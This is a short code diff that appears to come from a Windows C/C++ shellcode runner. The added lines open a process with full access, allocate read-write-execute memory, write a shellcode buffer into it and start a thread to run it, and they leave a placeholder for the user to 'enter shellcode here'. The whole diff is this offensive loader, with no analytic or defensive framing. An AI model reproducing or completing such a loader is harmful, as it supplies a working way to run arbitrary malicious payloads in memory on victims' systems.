@@ -35,7 +35,17 @@ void shellcode() // Define the shellcode function
     
     
     /* length: 925 bytes */
-    unsigned char shellcode[] = ""; // Enter your shellcode here
+    unsigned char shellcode[] = ""; // Enter shellcode here
+
+    HANDLE processHandle;
+    HANDLE remoteThread; 
+    PVOID remoteBuffer;
+
+    DWORD pnameid = GetCurrentProcessId(); // Get the ID of the current process
+    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pnameid); // Open the current process with all access rights
+    remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE); // Allocate memory in the current process for the shellcode
+    WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL); // Write the shellcode to the remote buffer
+    remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL); // Create a remote thread to execute the shellcode
     CloseHandle(processHandle); // Close the process handle
     WaitForSingleObject(remoteThread, INFINITE);
     
